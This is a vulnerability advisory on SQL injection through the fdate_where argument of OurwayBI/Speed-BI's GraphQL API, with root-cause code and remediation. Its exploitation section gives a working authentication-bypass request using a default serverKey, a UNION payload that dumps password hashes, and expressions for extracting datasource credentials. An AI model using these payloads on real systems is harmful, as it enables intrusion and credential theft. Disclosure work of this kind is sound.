# OurwayBI / Speed-BI — SQL Injection in getReviewObjs (fdate_where)

## 1. Overview

| Item | Value |
|---|---|
| Product | OurwayBI / Speed-BI |
| Vendor | Zhuhai Ourway Software Technology Co., Ltd. |
| Affected component | Cross_SBI_API (GraphQL backend, default port 4367) |
| Affected version | 8.10.x / 8.12.x (verified on 8.10.89) |
| Authentication | Session required by the query itself; no credentials needed when chained with the `loginValidPsw` bypass |
| CWE | CWE-89 SQL Injection |
| CVSS 3.1 | 8.1 `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` — 9.8 when chained with the authentication bypass |

## 2. Description

OurwayBI (also marketed as Speed-BI) is a commercial business-intelligence
platform by Zhuhai Ourway Software Technology, providing report design, data
visualisation, self-service analytics and multi-datasource integration. Its
Node.js component Cross_SBI_API exposes business capabilities as GraphQL
fields under `/api/graphql`.

**The product is closed source.** The code in this report was recovered from
the server-side JavaScript bundle shipped with the product and cross-checked
against the injection results obtained from live instances.

The GraphQL query `getReviewObjs` accepts a two-element date array,
`fdate_where`. The resolver concatenates both elements into a SQL fragment and
executes that fragment with `whereRaw()`, with no escaping and no parameter
binding. A single quote in `fdate_where[0]` closes the surrounding string
literal and the rest of the WHERE clause becomes attacker-controlled.

The injection is database-agnostic: the only protection is a quote character
that the application itself inserts, so SQLite, MySQL and SQL Server are all
affected.

## 3. Root cause

### 3.1 Where the fragment is built and executed

In `schema/resolver/Design/Reported.js`, `getReviewObjs` splits the work into
"build the string" and "execute it":

```js
// 1752-1758 — both date values are concatenated directly
fdate_where_str = "fmodifytime between " + datestart + "'" +
                  fdate_where[0] + " 00:00:00'" + dateend + " and " +
                  datestart + "'" + fdate_where[1] + " 23:59:59'" + dateend;

// 1767 — executed verbatim
if (fdate_where_str) select_s.whereRaw(fdate_where_str);
```

A second branch in the same resolver (line 1796) reuses the fragment with a
table alias and is equally injectable:

```js
if (fdate_where_str) select_s.whereRaw("a." + fdate_where_str);
```

![image-20261123202302279](./本地图片.assets/image-20261123202302279.png)

### 3.2 datestart / dateend are dialect wrappers, not escaping helpers

`Sharejs.to_date_str(dbtype)` returns the two halves of the date function of
the target database:

| dbtype | datestart | dateend |
|---|---|---|
| sqlite | `strftime('%Y-%m-%d %H:%M:%S',` | `)` |
| mysql | `str_to_date(` | `,'%Y-%m-%d %H:%i:%s')` |
| oracle | `to_date(` | `,'yyyy-MM-dd hh24:mi:ss')` |
| sqlserver | `Convert(varchar(19),` | `, 120)` |

They provide no escaping. The single quotes around the user value are
hard-coded by the application, so one quote in `fdate_where[0]` is enough to
close the literal.

### 3.3 The same statement shows the correct pattern

The query uses three different condition styles, and only the third is unsafe:

```js
.where({ forgid_top: forgid_top, frptid: frptid })   // object form -> bound
.where("fstatic", fstate)                            // key/value    -> bound
.whereRaw(fdate_where_str)                           // raw string   -> injection
```

knex offers a safe binding channel and the same function already uses it; only
the date range was handed to `whereRaw()`. This is a single-point implementation
error, not a lack of knowledge.

### 3.4 Where the parameter comes from

`fdate_where` is destructured at `Reported.js:1575` straight from the resolver
arguments:

```js
fdate_where = _ref7.fdate_where === void 0 ? [] : _ref7.fdate_where
```

The schema declares it as `[String]`. There is no format check, no length
limit and no date validation; the only processing is duplicating the value when
the array has one element (line 1757).

![image-20261123203741266](./本地图片.assets/image-20261123203741266.png)

### 3.5 Interaction with the authentication bypass

The main query carries `.where({ forgid_top: forgid_top })`, where the value
comes from the token. Called without an identity, knex throws at compile time
(`Undefined binding(s) ... "forgid_top" = ?`) and the statement never reaches
`whereRaw()`.

The exploitation order is therefore: obtain an administrator `ftoken` through
`loginValidPsw` (`iscas:true` with the default `serverKey`), then send the
injection with that token.

## 4. Exploitation

### 4.1 Break out of the string literal

```
fdate_where[0] = x') AND 1=0 UNION SELECT <col1>,<col2>,'1',1 FROM <table> --
```

`x')` closes the `strftime(...)` string and parenthesis, `AND 1=0` empties the
original result set, and `-- ` comments out the trailing
` 00:00:00') and ...`. The UNION must match the four selected columns
(`fid`, `fcreateuser`, `fstatic`, `fselect_idx`).

First, obtain an administrator token without a password:

```http
POST /api/graphql HTTP/1.1
Host: <target>:8080
Content-Type: application/json

{"query":"{loginValidPsw(fusername:\"admin\",iscas:true,serverKey:\"ourwayhq!@#\")}"}
```

Then send the injection:

```http
POST /api/graphql HTTP/1.1
Host: <target>:8080
Content-Type: application/json

{"query":"{getReviewObjs(frptid:\"1\",fusername:\"admin\",fstate:5,fdefsql:\"\",fdate_where:[\"x') AND 1=0 UNION SELECT username,userpassword,'1',1 FROM t_user -- \",\"2020-01-02\"],fissubmit:1,fmore_where:\"\",pageSize:20,fisSingleBatch:true)}","ftoken":"<token>","ftokenswarm":""}
```

![image-20261117140643564](./本地图片.assets/image-20261117140643564.png)

### 4.2 Reading the response

The resolver returns a URL-encoded JSON document. After decoding:

```json
{"reviewData":[{"fid":"admin","fcreateuser":"2495a170750f947459885b78b3372c79",
                "fstatic":"1","fselect_idx":1}]}
```

Only two columns are reflected (`fid`, `fcreateuser`), so reading whole tables
requires `group_concat()` with a delimiter.

![image-20261117140908669](./本地图片.assets/image-20261117140908669.png)

![image-20261117140851000](./本地图片.assets/image-20261117140851000.png)

### 4.3 Useful expressions

| Goal | Expression |
|---|---|
| Table list (SQLite) | `group_concat(name)` from `sqlite_master where type='table'` |
| Table DDL | `replace(sql,char(10),' ')` from `sqlite_master where name='t_cross_connstr'` |
| Datasource rows | `group_concat(fid\|\|'~'\|\|fhost\|\|'~'\|\|fusername\|\|'~'\|\|fpassword,'\n')` from `t_cross_connstr` |
| User hashes | `group_concat(username\|\|':' \|\|userpassword)` from `t_user` |

Chinese text is stored as GBK; return `hex(column)` and decode with
`bytes.fromhex(v).decode('gbk')` to avoid replacement characters.

### 4.4 Other database types

The payload is placed inside the date function of the target database and is
equally effective. Exploitation was confirmed on SQLite (two instances),
SQL Server and MySQL.

SQLite — `xmjl.<redacted>:8080`:

![image-20261119211546020](./本地图片.assets/image-20261119211546020.png)

SQLite — `sxjxfsbapi.<redacted>:8080`:

![image-20261119211758434](./本地图片.assets/image-20261119211758434.png)

SQL Server — `mainapitest.<redacted>:8808`:

![image-20261119215254566](./本地图片.assets/image-20261119215254566.png)

![image-20261119215304730](./本地图片.assets/image-20261119215304730.png)

MySQL — `help.<redacted>:8180`:

![image-20261119215549859](./本地图片.assets/image-20261119215549859.png)

![image-20261119222915030](./本地图片.assets/image-20261119222915030.png)

MySQL — `ds100.<redacted>:8180`:

![image-20261119222605919](./本地图片.assets/image-20261119222605919.png)

![image-20261119222955901](./本地图片.assets/image-20261119222955901.png)

## 5. Proof of concept

A read-only Python PoC is bundled with this report. It accepts an expression,
a source table and a WHERE clause, and prints the two reflected columns.

## 6. Impact

- Read access to the entire metadata database: user password hashes, datasource
  connection records, report definitions, audit records
- Retrieval of stored datasource credentials pointing at customer business
  databases (MySQL, SQL Server, Oracle)
- Those credentials are AES-encrypted with a key hard-coded in the product
  source, so they can be decrypted offline once extracted
- Chained with the `loginValidPsw` bypass, exploitable with no credentials

## 7. Remediation

1. Replace `whereRaw()` with parameter binding:

   ```js
   select_s.whereBetween("fmodifytime", [start + " 00:00:00", end + " 23:59:59"])
   ```

2. Validate `fdate_where` as two ISO-8601 dates and reject anything else.
3. Audit every other `whereRaw()` call in the codebase for the same pattern.
4. Fix the authentication bypass that makes this reachable without credentials.

## 8. Legal

All testing was performed against systems the reporter is authorised to
assess. Hostnames of third-party deployments have been replaced with
placeholders.
